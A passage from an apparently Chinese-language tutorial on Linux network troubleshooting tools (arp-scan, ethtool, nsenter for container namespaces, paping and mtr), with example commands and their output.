</span></span><span class="line"><span class="cl">195.133.10.1    00:1f:ce:72:bd:8c       QTECH LLC
</span></span><span class="line"><span class="cl">195.133.10.2    56:85:8e:2b:cf:11       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">195.133.10.5    de:58:c6:5b:b5:c2       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">195.133.10.7    de:ed:ae:4b:7a:c8       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">195.133.10.6    d2:a6:f4:4c:f0:4b       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置源mac">设置源mac</h3>
<p>在apr扫描的过程中，会使用现有的mac地址进行请求，这样会留下网络痕迹，<code>arp-scan</code> 提供了修改源mac的功能。使用 <code>--destaddr</code> 或 <code>-T</code> 。</p>
<p>###指定特殊vlan</p>
<p>在网络设备中，一个接口可以实现多个网络，这使用了虚拟局域网VLAN（Virtual Local Area Network）的多路复用协议。如果接口是 <code>trunk</code> ，意味接口承载多个VLAN，我们可能需要指定VLAN id，可以使用 <code>--vlan</code> 或 <code>-Q</code>指定vlan id</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan -i eth0 -Q <span class="m">10</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="发现网络冲突">发现网络冲突</h3>
<p><code>arp-scan</code> 也可用于发现IP冲突与识别设备等操，只需一个命令 <code>arp scan -l</code>。可以通过 <code>-i</code> 指定端口。</p>
<p>这里 <code>192.168.1.39</code> 冲突，因为出现了两次并且指定了不同的mac地址。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan –I eth0 -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">192.168.1.10   00:1b:a9:63:a2:4c       BROTHER INDUSTRIES, LTD.
</span></span><span class="line"><span class="cl">192.168.1.30   00:1e:8f:58:ec:49       CANON INC.
</span></span><span class="line"><span class="cl">192.168.1.33   00:25:4b:1b:10:20       Apple, Inc
</span></span><span class="line"><span class="cl">192.168.1.37   10:9a:dd:55:d7:95       Apple Inc
</span></span><span class="line"><span class="cl">192.168.1.38   20:c9:d0:27:8d:56       <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.1.39   d4:85:64:4d:35:be       Hewlett Packard
</span></span><span class="line"><span class="cl">192.168.1.39   00:0b:46:e4:8e:6d       Cisco <span class="o">(</span>DUP: 2<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.1.40   90:2b:34:18:59:c0       <span class="o">(</span>Unknown<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ethtool">ethtool</h2>
<p><code>ethtool</code> 命令用于 显示, 配置以太网设备。可以在Linux中使用此工具更改网卡速度, 自动协商, LAN唤醒设置, 双工模式。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>ethtool</code>   ；<code>apt install ethtool</code></li>
<li>CentOS/Fedora: <code>ethtool</code> (epel)  ；<code>yum install -y ethtool</code></li>
<li>Apline：<code>ethtool</code> ；<code>apk add --no-cache ethtool</code></li>
</ul>
</blockquote>
<h3 id="列出以太网设备属性">列出以太网设备属性</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ethtool eth0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Settings <span class="k">for</span> eth0:
</span></span><span class="line"><span class="cl">        Supported ports: <span class="o">[</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl">        Supported link modes:   Not reported
</span></span><span class="line"><span class="cl">        Supported pause frame use: No
</span></span><span class="line"><span class="cl">        Supports auto-negotiation: No
</span></span><span class="line"><span class="cl">        Supported FEC modes: Not reported
</span></span><span class="line"><span class="cl">        Advertised link modes:  Not reported
</span></span><span class="line"><span class="cl">        Advertised pause frame use: No
</span></span><span class="line"><span class="cl">        Advertised auto-negotiation: No
</span></span><span class="line"><span class="cl">        Advertised FEC modes: Not reported
</span></span><span class="line"><span class="cl">        Speed: Unknown!
</span></span><span class="line"><span class="cl">        Duplex: Unknown! <span class="o">(</span>255<span class="o">)</span>
</span></span><span class="line"><span class="cl">        Port: Other
</span></span><span class="line"><span class="cl">        PHYAD: <span class="m">0</span>
</span></span><span class="line"><span class="cl">        Transceiver: internal
</span></span><span class="line"><span class="cl">        Auto-negotiation: off
</span></span><span class="line"><span class="cl">        Link detected: yes
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看网络接口于容器内接口的对应关系">查看网络接口于容器内接口的对应关系</h3>
<p>可以通过ethtool查看容器的网卡对，通过<code>-S</code> 加接口设备名，<code>-S</code> 为统计信息</p>
<p>在宿主机上 使用命令查看，其中<code>peer_ifindex: 767</code> 对应容器内 <code>ip link</code> 的编号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ethtool -S veth45562ed 
</span></span></code></pre></td></tr></table>
</div>
</div><p>容器内</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ip link
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">767: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default
</span></span><span class="line"><span class="cl">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nsenter">nsenter</h2>
<p>nsenter是一款可以进入进程的名称空间中。例如，如果一个容器以非 root 用户身份运行，而使用 <code>docker exec</code> 进入其中后，但该容器没有安装 <code>sudo</code> 或未 <code>netstat</code> ，并且您想查看其当前的网络属性，如开放端口，这种场景下将如何做到这一点？<em><strong>nsenter</strong></em> 就是用来解决这个问题的。</p>
<p><strong>nsenter</strong> (<em>namespace enter</em>) 可以在容器的宿主机上使用 <em>nsenter</em> 命令进入容器的命名空间，以容器视角使用宿主机上的相应网络命令进行操作。==当然需要拥有 <em>root</em> 权限==</p>
<blockquote>
<p><strong>各系统下的安装</strong> <sup><a href="#4">[4]</a></sup></p>
<ul>
<li>Ubuntu/Debian: <code>util-linux</code>  ；<code>apt-get install -y util-linux</code></li>
<li>CentOS/Fedora: <code>util-linux</code> ；<code>yum install -y util-linux</code></li>
<li>Apline：<code>util-linux</code> ；<code>apk add util-linux --no-cache</code></li>
</ul>
</blockquote>
<p><em>nsenter</em> 的使用语法为，<code>nsenter -t pid -n &lt;commond&gt;</code>，<code>-t</code> 接 进程ID号，<code>-n</code> 表示进入名称空间内，<code>&lt;commond&gt;</code> 为执行的命令。更多的内容可以参考 <sup><a href="#3">[3]</a></sup></p>
<p>实例：如我们有一个Pod进程ID为30858，进入该Pod名称空间内执行 <code>ifconfig</code> ，如下列所示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ps -ef<span class="p">|</span>grep tail
</span></span><span class="line"><span class="cl">root      <span class="m">17636</span>  <span class="m">62887</span>  <span class="m">0</span> 20:19 pts/2    00:00:00 grep --color<span class="o">=</span>auto tail
</span></span><span class="line"><span class="cl">root      <span class="m">30858</span>  <span class="m">30838</span>  <span class="m">0</span> 15:55 ?        00:00:01 tail -f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ nsenter -t <span class="m">30858</span> -n ifconfig
</span></span><span class="line"><span class="cl">eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1480</span>
</span></span><span class="line"><span class="cl">        inet 192.168.1.213  netmask 255.255.255.0  broadcast 192.168.1.255
</span></span><span class="line"><span class="cl">        ether 5e:d5:98:af:dc:6b  txqueuelen <span class="m">0</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">92</span>  bytes <span class="m">9100</span> <span class="o">(</span>8.8 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">92</span>  bytes <span class="m">8422</span> <span class="o">(</span>8.2 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="m">65536</span>
</span></span><span class="line"><span class="cl">        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class="line"><span class="cl">        loop  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Local Loopback<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">5</span>  bytes <span class="m">448</span> <span class="o">(</span>448.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">5</span>  bytes <span class="m">448</span> <span class="o">(</span>448.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">net1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 10.1.0.201  netmask 255.255.255.0  broadcast 10.1.0.255
</span></span><span class="line"><span class="cl">        ether b2:79:f9:dd:2a:10  txqueuelen <span class="m">0</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">228</span>  bytes <span class="m">21272</span> <span class="o">(</span>20.7 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">216</span>  bytes <span class="m">20272</span> <span class="o">(</span>19.7 KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="如何定位pod名称空间">如何定位Pod名称空间</h3>
<p>首先需要确定Pod所在的节点名称</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ kubectl get pods -owide <span class="p">|</span>awk <span class="s1">&#39;{print $1,$7}&#39;</span>
</span></span><span class="line"><span class="cl">NAME NODE
</span></span><span class="line"><span class="cl">netbox-85865d5556-hfg6v master-machine
</span></span><span class="line"><span class="cl">netbox-85865d5556-vlgr4 node01
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果Pod不在当前节点还需要用IP登录则还需要查看IP（可选）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ kubectl get pods -owide <span class="p">|</span>awk <span class="s1">&#39;{print $1,$6,$7}&#39;</span>
</span></span><span class="line"><span class="cl">NAME IP NODE
</span></span><span class="line"><span class="cl">netbox-85865d5556-hfg6v 192.168.1.213 master-machine
</span></span><span class="line"><span class="cl">netbox-85865d5556-vlgr4 192.168.0.4 node01
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，登录节点，获取容器lD，如下列所示，每个pod默认有一个 <em>pause</em> 容器，其他为用户yaml文件中定义的容器，理论上所有容器共享相同的网络命名空间，排查时可任选一个容器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ docker ps <span class="p">|</span>grep netbox-85865d5556-hfg6v
</span></span><span class="line"><span class="cl">6f8c58377aae   f78dd05f11ff                                                    <span class="s2">&#34;tail -f&#34;</span>                <span class="m">45</span> hours ago   Up <span class="m">45</span> hours             k8s_netbox_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
</span></span><span class="line"><span class="cl">b9c732ee457e   registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1   <span class="s2">&#34;/pause&#34;</span>                 <span class="m">45</span> hours ago   Up <span class="m">45</span> hours             k8s_POD_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来获得获取容器在节点系统中对应的进程号，如下所示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ docker inspect --format <span class="s2">&#34;{{ .State.Pid }}&#34;</span> 6f8c58377aae
</span></span><span class="line"><span class="cl"><span class="m">30858</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后就可以通过 <em>nsenter</em> 进入容器网络空间执行命令了</p>
<h2 id="paping">paping</h2>
<p><strong>paping</strong> 命令可对目标地址指定端口以TCP协议进行连续ping，通过这种特性可以弥补 <em>ping</em> ICMP协议，以及 <em>nmap</em> , <em>telnet</em> 只能进行一次操作的的不足；通常情况下会用于测试端口连通性和丢包率</p>
<p>paping download：<a href="https://code.google.com/archive/p/paping/">paping</a></p>
<p><em>paping</em> 还需要安装以下依赖，这取决于你安装的 <em>paping</em> 版本</p>
<ul>
<li>RedHat/CentOS：<code>yum install -y libstdc++.i686 glibc.i686</code></li>
<li>Ubuntu/Debian：最小化安装无需依赖</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ paping -h
</span></span><span class="line"><span class="cl">paping v1.5.5 - Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2011</span> Mike Lovell
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Syntax: paping <span class="o">[</span>options<span class="o">]</span> destination
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl"> -?, --help     display usage
</span></span><span class="line"><span class="cl"> -p, --port N   <span class="nb">set</span> TCP port N <span class="o">(</span>required<span class="o">)</span>
</span></span><span class="line"><span class="cl">     --nocolor  Disable color output
</span></span><span class="line"><span class="cl"> -t, --timeout  timeout in milliseconds <span class="o">(</span>default 1000<span class="o">)</span>
</span></span><span class="line"><span class="cl"> -c, --count N  <span class="nb">set</span> number of checks to N
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mtr">mtr</h2>
<p><strong>mtr</strong> 是一个跨平台的网络诊断工具，将 <strong>traceroute</strong> 和 <strong>ping</strong> 的功能结合到一个工具。与 <em>traceroute</em> 不同的是 <em>mtr</em> 显示的信息比起 <em>traceroute</em> 更加丰富：通过 <em>mtr</em> 可以确定网络的条数，并且可以同时打印响应百分比以及网络中各跳跃点的响应时间。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>mtr</code>  ；<code>apt-get install -y mtr</code></li>
<li>CentOS/Fedora: <code>mtr</code> ；<code>yum install -y mtr</code></li>
<li>Apline：<code>mtr</code> ；<code>apk add mtr --no-cache</code></li>
</ul>
</blockquote>
<h3 id="简单的使用示例">简单的使用示例</h3>
<p>最简单的示例，就是后接域名或IP，这将跟踪整个路由</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mtr google.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Start: Thu Jun <span class="m">28</span> 12:10:13 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
</span></span><span class="line"><span class="cl">  1.<span class="p">|</span>-- 192.168.0.1                0.0%     <span class="m">5</span>    0.3   0.3   0.3   0.4   0.0
</span></span><span class="line"><span class="cl">  2.<span class="p">|</span>-- 5.5.5.211                  0.0%     <span class="m">5</span>    0.7   0.9   0.7   1.3   0.0
</span></span><span class="line"><span class="cl">  3.<span class="p">|</span>-- 209.snat-111-91-120.hns.n 80.0%     <span class="m">5</span>    7.1   7.1   7.1   7.1   0.0
</span></span><span class="line"><span class="cl">  4.<span class="p">|</span>-- 72.14.194.226              0.0%     <span class="m">5</span>    1.9   2.9   1.9   4.4   1.1
</span></span><span class="line"><span class="cl">  5.<span class="p">|</span>-- 108.170.248.161            0.0%     <span class="m">5</span>    2.9   3.5   2.0   4.3   0.7
</span></span><span class="line"><span class="cl">  6.<span class="p">|</span>-- 216.239.62.237             0.0%     <span class="m">5</span>    3.0   6.2   2.9  18.3   6.7
</span></span><span class="line"><span class="cl">  7.<span class="p">|</span>-- bom05s12-in-f14.1e100.net  0.0%     <span class="m">5</span>    2.1   2.4   2.0   3.8   0.5
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>-n</code> 强制 <em>mtr</em> 打印 IP地址而不是主机名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mtr -n google.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Start: Thu Jun <span class="m">28</span> 12:12:58 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
</span></span><span class="line"><span class="cl">  1.<span class="p">|</span>-- 192.168.0.1                0.0%     <span class="m">5</span>    0.3   0.3   0.3   0.4   0.0
</span></span><span class="line"><span class="cl">  2.<span class="p">|</span>-- 5.5.5.211                  0.0%     <span class="m">5</span>    0.9   0.9   0.8   1.1   0.0
</span></span><span class="line"><span class="cl">  3.<span class="p">|</span>-- ???                       100.0     <span class="m">5</span>    0.0   0.0   0.0   0.0   0.0
</span></span><span class="line"><span class="cl">  4.<span class="p">|</span>-- 72.14.194.226              0.0%     <span class="m">5</span>    2.0   2.0   1.9   2.0   0.0
</span></span><span class="line"><span class="cl">  5.<span class="p">|</span>-- 108.170.248.161            0.0%     <span class="m">5</span>    2.3   2.3   2.2   2.4   0.0
</span></span><span class="line"><span class="cl">  6.<span class="p">|</span>-- 216.239.62.237             0.0%     <span class="m">5</span>    3.0   3.2   3.0   3.3   0.0
</span></span><span class="line"><span class="cl">  7.<span class="p">|</span>-- 172.217.160.174            0.0%     <span class="m">5</span>    3.7   3.6   2.0   5.3   1.4
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>-b</code> 同时显示IP地址与主机名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mtr -b google.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Start: Thu Jun <span class="m">28</span> 12:14:36 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
</span></span><span class="line"><span class="cl">  1.<span class="p">|</span>-- 192.168.0.1                0.0%     <span class="m">5</span>    0.3   0.3   0.3   0.4   0.0
</span></span><span class="line"><span class="cl">  2.<span class="p">|</span>-- 5.5.5.211                  0.0%     <span class="m">5</span>    0.7   0.8   0.6   1.0   0.0
</span></span><span class="line"><span class="cl">  3.<span class="p">|</span>-- 209.snat-111-91-120.hns.n  0.0%     <span class="m">5</span>    1.4   1.6   1.3   2.1   0.0
</span></span><span class="line"><span class="cl">  4.<span class="p">|</span>-- 72.14.194.226              0.0%     <span class="m">5</span>    1.8   2.1   1.8   2.6   0.0
</span></span><span class="line"><span class="cl">  5.<span class="p">|</span>-- 108.170.248.209            0.0%     <span class="m">5</span>    2.0   1.9   1.8   2.0   0.0
</span></span><span class="line"><span class="cl">  6.<span class="p">|</span>-- 216.239.56.115             0.0%     <span class="m">5</span>    2.4   2.7   2.4   2.9   0.0
</span></span><span class="line"><span class="cl">  7.<span class="p">|</span>-- bom07s15-in-f14.1e100.net  0.0%     <span class="m">5</span>    3.7   2.2   1.7   3.7   0.9
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>-c</code> 跟一个具体的值，这将限制 <em>mtr</em> ping的次数，到达次数后会退出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mtr -c5 google.com
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果需要指定次数，并且在退出后保存这些数据，使用 <code>-r</code> flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mtr -r -c <span class="m">5</span> google.com &gt;  <span class="m">1</span>
</span></span><span class="line"><span class="cl">$ cat <span class="m">1</span>
</span></span><span class="line"><span class="cl">Start: Sun Aug <span class="m">21</span> 22:06:49 <span class="m">2022</span>
</span></span><span class="line"><span class="cl">HOST: xxxxx.xxxxx.xxxx.xxxx Loss%   Snt   Last   Avg  Best  Wrst StDev
</span></span><span class="line"><span class="cl">  1.<span class="p">|</span>-- gateway                    0.0%     <span class="m">5</span>    0.6 146.8   0.6 420.2 191.4
</span></span><span class="line"><span class="cl">  2.<span class="p">|</span>-- 212.xx.21.241              0.0%     <span class="m">5</span>    0.4   1.0   0.4   2.3   0.5
</span></span><span class="line"><span class="cl">  3.<span class="p">|</span>-- 188.xxx.106.124            0.0%     <span class="m">5</span>    0.7   1.1   0.7   2.1   0.5
</span></span><span class="line"><span class="cl">  4.<span class="p">|</span>-- ???                       100.0     <span class="m">5</span>    0.0   0.0   0.0   0.0   0.0
</span></span><span class="line"><span class="cl">  5.<span class="p">|</span>-- 72.14.209.89               0.0%     <span class="m">5</span>   43.2  43.3  43.1  43.3   0.0
</span></span><span class="line"><span class="cl">  6.<span class="p">|</span>-- 108.xxx.250.33             0.0%     <span class="m">5</span>   43.2  43.1  43.1  43.2   0.0
</span></span><span class="line"><span class="cl">  7.<span class="p">|</span>-- 108.xxx.250.34             0.0%     <span class="m">5</span>   43.7  43.6  43.5  43.7   0.0
</span></span><span class="line"><span class="cl">  8.<span class="p">|</span>-- 142.xxx.238.82             0.0%     <span class="m">5</span>   60.6  60.9  60.6  61.2   0.0
</span></span><span class="line"><span class="cl">  9.<span class="p">|</span>-- 142.xxx.238.64             0.0%     <span class="m">5</span>   59.7  67.5  59.3  89.8  13.2
</span></span><span class="line"><span class="cl"> 10.<span class="p">|</span>-- 142.xxx.37.81              0.0%     <span class="m">5</span>   62.7  62.9  62.6  63.5   0.0
</span></span><span class="line"><span class="cl"> 11.<span class="p">|</span>-- 142.xxx.229.85             0.0%     <span class="m">5</span>   61.0  60.9  60.7  61.3   0.0
</span></span><span class="line"><span class="cl"> 12.<span class="p">|</span>-- xx-in-f14.1e100.net  0.0%     <span class="m">5</span>   59.0  58.9  58.9  59.0   0.0
</span></span></code></pre></td></tr></table>
</div>
</div><p>默认使用的是 ICMP 协议 <code>-i</code> ，可以指定 <code>-u</code>,  <code>-t</code> 使用其他协议</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mtr --tcp google.com
</span></span></code></pre></td></tr></table>
</div>
